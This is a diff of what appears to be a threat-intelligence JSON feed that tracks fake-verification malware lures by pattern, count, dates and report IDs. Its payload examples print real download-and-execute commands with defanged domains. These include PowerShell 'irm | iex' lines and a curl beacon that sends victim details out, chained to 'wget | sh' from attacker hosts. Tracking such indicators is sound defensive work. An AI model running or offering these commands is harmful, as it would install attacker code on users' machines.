@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 77,
-    "ReportCount": 77,
+    "DistinctPayloadCount": 79,
+    "ReportCount": 79,
     "FirstSeen": "2026-11-19T23:19:43.828000+00:00",
-    "LastSeen": "2026-11-26T03:18:21.600000+00:00",
+    "LastSeen": "2026-11-26T15:26:02.717000+00:00",
     "ReportIds": [
       "cmwo6a5551xu40omla5b849lo",
       "cmwo9kdgz1ys80omlr22sxrni",
@@ -82,7 +82,9 @@
       "cmwwx6daj09140omlbj2a6pwj",
       "cmwwxwlqs09tn0omljnpapkyh",
       "cmwwz4un60b1n0omlxioear0m",
-      "cmwwzg4sn0bf20oml6olafw5a"
+      "cmwwzg4sn0bf20oml6olafw5a",
+      "cmwxozekr0ff00oml1mrfdppx",
+      "cmwxpfxxr0fi30omlvtp74p8o"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
@@ -159,17 +161,19 @@
       "(irm 'https://j7tracker[.]gb[.]net/wp/ed4b09c0e61090d0')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/3d1913df07e3f332')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/3f5a6d13ba8f4f3d')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/6e127be45e3ae0a7')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/6e377c27970e7c39')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/96a5a2fe13040cc4')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/ee0a397ab22d5ac6')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/f23dfa65aa0d4c27')|iex"
     ]
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 50,
-    "ReportCount": 50,
+    "DistinctPayloadCount": 51,
+    "ReportCount": 51,
     "FirstSeen": "2026-11-19T18:53:30.900000+00:00",
-    "LastSeen": "2026-11-26T08:12:00.056000+00:00",
+    "LastSeen": "2026-11-26T15:12:41.320000+00:00",
     "ReportIds": [
       "cmwnwrsgu1xi10omlj9jbvrk0",
       "cmwo69tad1xsb0omltg23i5hb",
@@ -220,7 +224,8 @@
       "cmwwqyouc07dh0omlolqmo2dw",
       "cmwx071yw0c8v0omlp9z99b26",
       "cmwx5xlvf0dhd0omlllskz3uu",
-      "cmwx9xrcu0dyy0omlur2m2nt0"
+      "cmwx9xrcu0dyy0omlur2m2nt0",
+      "cmwxoyrm40fd70oml5xlrq4dq"
     ],
     "PayloadExamples": [
       "irm 'browse-login[.]info/083af9e16202853f'|iex;",
@@ -228,6 +233,7 @@
       "irm 'browse-login[.]info/55f33c8c387348f5'|iex;",
       "irm 'browse-login[.]info/5f9f679de6720a09'|iex;",
       "irm 'browse-login[.]info/66a3105c05a5b069'|iex;",
+      "irm 'browse-login[.]info/83ce1560fce0ed88'|iex;",
       "irm 'browse-login[.]info/96598984d8229501'|iex;",
       "irm 'browse-login[.]info/9a3e2f700f7d099a'|iex;",
       "irm 'browse-login[.]info/a0ab86b89832a232'|iex;",
@@ -277,12 +283,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 18,
-    "ReportCount": 18,
-    "FirstSeen": "2026-11-19T15:28:10.392000+00:00",
+    "DistinctPayloadCount": 17,
+    "ReportCount": 17,
+    "FirstSeen": "2026-11-20T05:24:19.392000+00:00",
     "LastSeen": "2026-11-24T20:38:56.659000+00:00",
     "ReportIds": [
-      "cmwnpfpw41x2g0oml742g5tyb",
       "cmwojb0hj1znf0omlyv0jyf2b",
       "cmwpzcr2n24ra0oml4n6uxgmk",
       "cmwpzddeq24s10omly50fbwvt",
@@ -313,7 +318,6 @@
       "curl -sL -d \"id=828944bd-1f28-4c77-9cbc-9cc3f9894257&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fjewelsthecelebrant[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A20%3A16.169Z&lastShellAt=2026-11-22T06%3A20%3A16.169Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=86c4c5bc-11cc-4626-9479-c5ca2a574a74&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]khreader[.]epizy[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A37%3A31.873Z&lastShellAt=2026-11-24T20%3A37%3A31.873Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=a29e020e-8086-463b-8bb6-a7daaf24e3c2&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falomaglow[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T06%3A10%3A29.130Z&lastShellAt=2026-11-22T06%3A10%3A29.130Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=a84a1d7a-2fe1-4e25-95c5-229ef6b01df9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnucleus.ltd%2F&os=Linux%20x86_64&lastVisitAt=2026-11-19T15%3A26%3A47.440Z&lastShellAt=2026-11-19T15%3A26%3A47.440Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=bc759bae-8f26-4220-8046-410284017e55&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]ascent[.]se%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T19%3A30%3A35.746Z&lastShellAt=2026-11-24T19%3A30%3A35.746Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=d8ebc3db-7e0c-4d08-893a-27c2e899f5c0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]kathleensinclair[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A50%3A27.241Z&lastShellAt=2026-11-21T17%3A50%3A27.241Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=e0dfcb69-2b9c-4ad4-8e3d-08745ee4c064&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvnailsupply[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A01%3A12.726Z&lastShellAt=2026-11-21T18%3A01%3A12.726Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -596,13 +600,14 @@
   {
     "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 3,
+    "ReportCount": 4,
     "FirstSeen": "2026-11-24T18:33:06.136000+00:00",
-    "LastSeen": "2026-11-25T23:34:00.107000+00:00",
+    "LastSeen": "2026-11-26T14:59:30.123000+00:00",
     "ReportIds": [
       "cmwv18snu0a6b0nmlpoa09xzd",
       "cmwwjla6o00hi0omls2saar36",
-      "cmwwrflwh07q50omlekf5zm7a"
+      "cmwwrflwh07q50omlekf5zm7a",
+      "cmwxoht2w0fc80oml53cyksew"
     ],
     "PayloadExamples": [
       "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
